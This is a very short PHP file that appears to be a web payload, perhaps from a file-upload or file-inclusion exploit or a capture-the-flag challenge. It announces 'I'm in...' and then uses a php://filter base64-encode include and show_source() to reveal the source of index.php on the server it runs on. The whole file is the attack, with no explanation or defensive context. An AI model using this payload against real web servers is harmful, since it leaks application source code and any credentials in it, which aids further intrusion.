<?php

echo "I'm in...";

include("php://filter/read=convert.base64-encode/resource=index.php");
show_source("index.php");
